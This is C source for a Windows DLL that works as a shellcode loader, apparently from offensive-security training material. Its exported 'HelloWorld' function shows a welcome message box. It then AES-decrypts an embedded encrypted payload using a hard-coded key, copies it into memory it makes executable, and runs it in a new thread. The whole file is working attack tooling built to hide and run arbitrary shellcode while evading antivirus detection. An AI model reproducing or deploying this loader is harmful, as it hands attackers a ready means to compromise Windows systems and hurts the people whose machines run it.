#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}	

extern "C" {
__declspec(dllexport) BOOL WINAPI HelloWorld(void) {

	MessageBox( NULL, "Welcome!", "ckurity", MB_OK );

    unsigned char AESkey[] = { 0x91, 0x44, 0xa7, 0x23, 0x2, 0xaf, 0x4e, 0xd8, 0x1b, 0x2, 0xb2, 0x50, 0x77, 0x44, 0x66, 0x9 };
    unsigned char payload[] = { 0x90, 0x67, 0xa5, 0x64, 0x4, 0xf2, 0x34, 0x84, 0x84, 0x6f, 0xfc, 0x88, 0xd6, 0x26, 0x1, 0x56, 0xb8, 0x26, 0xbe, 0x4, 0x14, 0x54, 0xbb, 0x5f, 0x14, 0x7c, 0xa0, 0xea, 0xf7, 0xf6, 0x7c, 0xd7, 0xde, 0x5a, 0xad, 0x16, 0xe3, 0xce, 0xc7, 0x72, 0x56, 0xc8, 0x46, 0x14, 0x3d, 0xe, 0x1f, 0x67, 0x22, 0xbd, 0x18, 0x25, 0x3b, 0x56, 0x38, 0x21, 0x6c, 0xc1, 0x31, 0xdc, 0x17, 0x9f, 0x4d, 0x99, 0xc1, 0x15, 0xd2, 0xca, 0xd8, 0xc, 0x13, 0x99, 0x72, 0xe6, 0x73, 0xbe, 0x2a, 0xf4, 0x96, 0xcb, 0xa7, 0xc8, 0xda, 0xd0, 0xaf, 0xb6, 0xb3, 0x73, 0x13, 0xda, 0x1c, 0x38, 0x9a, 0x4a, 0xec, 0xfc, 0xfe, 0xd9, 0xf0, 0xe, 0xe3, 0xc1, 0xdd, 0x3e, 0xd, 0xc0, 0xfe, 0xd6, 0x43, 0x5, 0x7e, 0xe2, 0x23, 0x74, 0x19, 0xfc, 0x11, 0xd9, 0x10, 0x63, 0x2f, 0x69, 0x56, 0x2a, 0x23, 0xaa, 0x3a, 0xa0, 0x97, 0x98, 0x8e, 0xc5, 0xc0, 0xd2, 0x55, 0xf4, 0x45, 0x2c, 0x73, 0x82, 0x57, 0x8f, 0xcf, 0xd0, 0xa6, 0x81, 0xfa, 0xf, 0x78, 0xc9, 0x64, 0xd8, 0x5, 0x68, 0x37, 0x11, 0xf0, 0x58, 0x3f, 0x4e, 0x9e, 0x7b, 0x6f, 0xa1, 0x68, 0x18, 0x8, 0x63, 0xfd, 0xdf, 0xf5, 0x96, 0x43, 0x76, 0x8b, 0xf7, 0x9, 0xb3, 0x91, 0x7d, 0x6f, 0xea, 0xca, 0xb0, 0x8d, 0x34, 0xc6, 0x35, 0xa2, 0xea, 0xc8, 0x9d, 0x56, 0xb1, 0x64, 0x7c, 0xfb, 0x70, 0x7a, 0x6b, 0x48, 0x31, 0xae, 0x76, 0x8f, 0xb8, 0xaa, 0xfe, 0x6a, 0xd2, 0xb0, 0x34, 0x3d, 0xc2, 0x78, 0x8c, 0x8, 0x59, 0x8e, 0x3, 0x79, 0xc7, 0xa0, 0x58, 0xf2, 0xc8, 0x8e, 0xf8, 0x1a, 0x80, 0x21, 0xb, 0x66, 0xb6, 0x9f, 0xe7, 0xfa, 0x42, 0x8a, 0xe4, 0x20, 0xfd, 0x33, 0xe4, 0xbd, 0xc, 0xab, 0x8c, 0x39, 0x4, 0x4c, 0xfb, 0x74, 0x4a, 0x81, 0xd1, 0xfd, 0x70, 0xd9, 0x29, 0x26, 0x1, 0x1a, 0x76, 0xf7, 0x28, 0x60, 0x9d, 0xd2, 0x49, 0x1b, 0x96, 0x13, 0xb0, 0x13, 0xc, 0x50, 0x5d, 0x47, 0xe0, 0x58, 0x37, 0x75, 0xa4, 0x6c, 0x27, 0x81, 0x2e, 0x31, 0x90, 0x2b, 0x19, 0x59, 0xc4, 0x85, 0x3b, 0x4b, 0xed, 0xad, 0x50, 0x75, 0x20, 0x53, 0x30, 0xde, 0x1, 0x2, 0x9f, 0x9d, 0xe8, 0x74, 0xbf, 0xe, 0xab, 0x46, 0x8d, 0x8a, 0xae, 0x2c, 0x71, 0xa6, 0x55, 0x7, 0x3f, 0xd6, 0x3f, 0xa0, 0x90, 0xb2, 0x7a, 0x58, 0xf3, 0xbb, 0x16, 0x52, 0xd3, 0x9b, 0x49, 0xb7, 0x8b, 0x84, 0x93, 0x83, 0x6a, 0x73, 0x3a, 0x41, 0xe4, 0xe, 0x8f, 0x13, 0x2b, 0xcf, 0x23, 0x7c, 0x49, 0x1a, 0xd2, 0x1a, 0xf9, 0xb4, 0xd, 0xe8, 0xed, 0x9e, 0xe3, 0x99, 0xa5, 0xe3, 0xe6, 0xa8, 0x5, 0xf8, 0xd1, 0xab, 0x20, 0x6f, 0x5d, 0x67, 0xb9, 0x1e, 0xde, 0x6, 0x4a, 0xd9, 0x2a, 0xa9, 0x9f, 0x45, 0xe6, 0x8, 0x4f, 0x3e, 0x15, 0x20, 0xd6, 0x2f, 0x80, 0x88, 0xd7, 0x17, 0xbb, 0xa6, 0x80, 0xa6, 0xd4, 0x12, 0xf, 0x60, 0xb2, 0x33, 0x59, 0xde, 0x91, 0x70, 0x46, 0x54, 0x5c, 0x71, 0x2b, 0x4c, 0x96, 0xf7, 0xa8, 0x33, 0xc1, 0x8f, 0xb5, 0x7b, 0x55, 0x68, 0xea, 0x9b, 0xe7, 0x9f, 0x4a, 0x2f, 0x67, 0xea, 0x5b, 0x84, 0x1b, 0x22, 0x31, 0xc5, 0x82, 0xc3, 0x13, 0x82, 0x1b, 0xe8, 0x66, 0x8f, 0x4a, 0xe8, 0xb6, 0xeb, 0xce, 0xc8, 0xc1, 0x48, 0xb1, 0xfc, 0x68 };

    DWORD payload_length = sizeof(payload);

	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
    // Decrypt the AES payload to Original Shellcode
    DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
	MoveMemory(alloc_mem, payload, sizeof(payload));
	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	// getchar();
	// or
	((void(*)())alloc_mem)();

	return 0;

	return TRUE;
	}
}